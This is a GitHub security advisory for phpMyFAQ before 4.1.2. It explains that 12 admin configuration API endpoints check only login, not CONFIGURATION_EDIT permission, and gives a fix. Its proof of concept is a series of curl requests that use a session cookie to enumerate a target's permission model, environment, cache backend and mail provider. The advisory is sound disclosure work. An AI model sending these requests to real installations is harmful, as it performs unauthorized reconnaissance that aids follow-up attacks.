# [M] phpMyFAQ's Missing CONFIGURATION_EDIT Permission Check on 12 Admin API Configuration Tab Endpoints Allows Information Disclosure by Any Authenticated User

## Summary
Severity: Medium
Advisory: GHSA-rm98-82fr-mcfx
CVE: CVE-2026-45007
CWE: CWE-862
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2026-05-06
Source: https://github.com/advisories/GHSA-rm98-82fr-mcfx
Type: github-advisory

## Affected
- Packagist: `thorsten/phpmyfaq` — affected >=0 <4.1.2
- Packagist: `phpmyfaq/phpmyfaq` — affected >=0 <4.1.2

## Details
## Summary

12 endpoints in `ConfigurationTabController.php` use `userIsAuthenticated()` (login-only check) instead of `userHasPermission(PermissionType::CONFIGURATION_EDIT)`. This allows any authenticated user — including ones with zero admin permissions — to enumerate system configuration metadata including the permission model, active template, cache backend, mail provider, and translation provider.

## Details

The `ConfigurationTabController` contains 15 public endpoints. Three of them (`list`, `save`, `uploadTheme`) correctly enforce `CONFIGURATION_EDIT` permission:

```php
// phpmyfaq/src/phpMyFAQ/Controller/Administration/Api/ConfigurationTabController.php:63
public function list(Request $request): Response
{
    $this->userHasPermission(PermissionType::CONFIGURATION_EDIT); // ✅ Correct
    // ...
}
```

The remaining 12 only check that the user is logged in:

```php
// phpmyfaq/src/phpMyFAQ/Controller/Administration/Api/ConfigurationTabController.php:353
public function translations(): Response
{
    $this->userIsAuthenticated(); // ❌ Missing permission check
    // ...
}
```

The difference between these two methods is significant:

```php
// AbstractController.php:258 — login-only
protected function userIsAuthenticated(): void
{
    if (!$this->currentUser->isLoggedIn()) {
        throw new UnauthorizedHttpException(challenge: 'User is not authenticated.');
    }
}

// AbstractController.php:317 — login + permission check
protected function userHasPermission(PermissionType $permissionType): void
{
    if (!$this->currentUser->isLoggedIn()) {
        throw new UnauthorizedHttpException(challenge: 'User is not authenticated.');
    }
    $currentUser = $this->currentUser;
    if (!$currentUser?->perm->hasPermission($currentUser->getUserId(), $permissionType->value)) {
        throw new ForbiddenException(/* ... */);
    }
}
```

There is no middleware or router-level authorization — the Kernel (`Kernel.php`) dispatches directly to controllers with only Language, Router, and Exception listeners. All authorization is at the controller method level.

The 12 affected endpoints (all GET, all under `/admin/api/`):

| # | Method | Route | Info Exposed |
|---|--------|-------|-------------|
| 1 | `translations()` | `/configuration/translations` | Available languages + current language |
| 2 | `templates()` | `/configuration/templates` | Available themes + active theme |
| 3 | `faqsSortingKey()` | `/configuration/faqs-sorting-key/{current}` | FAQ sorting key options |
| 4 | `faqsSortingOrder()` | `/configuration/faqs-sorting-order/{current}` | FAQ sorting order |
| 5 | `faqsSortingPopular()` | `/configuration/faqs-sorting-popular/{current}` | Popular FAQ sorting |
| 6 | `permLevel()` | `/configuration/perm-level/{current}` | Permission model (basic/medium) |
| 7 | `releaseEnvironment()` | `/configuration/release-environment/{current}` | Dev/production environment |
| 8 | `searchRelevance()` | `/configuration/search-relevance/{current}` | Search relevance config |
| 9 | `seoMetaTags()` | `/configuration/seo-metatags/{current}` | SEO meta tag config |
| 10 | `translationProvider()` | `/configuration/translation-provider/{current}` | Translation service (DeepL, etc.) |
| 11 | `mailProvider()` | `/configuration/mail-provider/{current}` | Mail provider (SMTP, etc.) |
| 12 | `cacheAdapter()` | `/configuration/cache-adapter/{current}` | Cache backend (filesystem/redis/memcached) |

The `translations()` and `templates()` endpoints directly read from config/filesystem and expose current settings. The `{current}` endpoints render HTML `<option>` dropdowns where the caller-supplied value gets the `selected` attribute — an attacker can enumerate possible values to discover the current configuration.

## PoC

```bash
# Step 1: Authenticate as any user (even one with no admin permissions)
# and obtain the session cookie (pmf_auth_XXXX)

# Step 2: Query configuration endpoints that should require CONFIGURATION_EDIT permission

# Enumerate available languages and current language setting
curl -s -b 'pmf_auth_XXXX=<session>' \
  https://target.example/admin/api/configuration/translations

# Enumerate available templates and which is active
curl -s -b 'pmf_auth_XXXX=<session>' \
  https://target.example/admin/api/configuration/templates

# Discover permission model by trying known values
curl -s -b 'pmf_auth_XXXX=<session>' \
  https://target.example/admin/api/configuration/perm-level/basic

# Discover release environment
curl -s -b 'pmf_auth_XXXX=<session>' \
  https://target.example/admin/api/configuration/release-environment/development

# Discover cache backend
curl -s -b 'pmf_auth_XXXX=<session>' \
  https://target.example/admin/api/configuration/cache-adapter/filesystem

# Discover mail provider
curl -s -b 'pmf_auth_XXXX=<session>' \
  https://target.example/admin/api/configuration/mail-provider/smtp

# Discover translation provider
curl -s -b 'pmf_auth_XXXX=<session>' \
  https://target.example/admin/api/configuration/translation-provider/deepl
```

Expected: HTTP 403 Forbidden for a user without `configuration_edit` permission.
Actual: HTTP 200 with configuration data in HTML option format.

## Impact

Any authenticated user (e.g., a regular FAQ contributor or a user with minimal permissions) can enumerate:

- The instance's permission model (basic vs. medium) — reveals access control architecture
- Whether the instance runs in development or production mode — development mode may expose debug info
- The cache backend (filesystem/redis/memcached) — useful for targeting cache-specific attacks
- The mail provider configuration — reveals infrastructure details
- Available and active templates/themes — aids in targeting template-specific vulnerabilities
- Translation provider (e.g., DeepL) — reveals third-party service integrations

While no credentials or secrets are directly exposed, this configuration metadata aids targeted follow-up attacks and violates the principle of least privilege — these endpoints exist to serve the admin configuration UI and should require the same `CONFIGURATION_EDIT` permission as the `list` and `save` endpoints.

## Recommended Fix

Replace `$this->userIsAuthenticated()` with `$this->userHasPermission(PermissionType::CONFIGURATION_EDIT)` in all 12 affected methods:

```php
// In ConfigurationTabController.php — apply to all 12 methods
// Before (line 355, and equivalent in all others):
$this->userIsAuthenticated();

// After:
$this->userHasPermission(PermissionType::CONFIGURATION_EDIT);
```

Affected methods: `translations()`, `templates()`, `faqsSortingKey()`, `faqsSortingOrder()`, `faqsSortingPopular()`, `permLevel()`, `releaseEnvironment()`, `searchRelevance()`, `seoMetaTags()`, `translationProvider()`, `mailProvider()`, `cacheAdapter()`.

## References
- https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-rm98-82fr-mcfx
- https://nvd.nist.gov/vuln/detail/CVE-2026-45007
- https://github.com/thorsten/phpMyFAQ
- https://www.vulncheck.com/advisories/phpmyfaq-missing-permission-check-on-12-configuration-api-endpoints-allows-information-disclosure
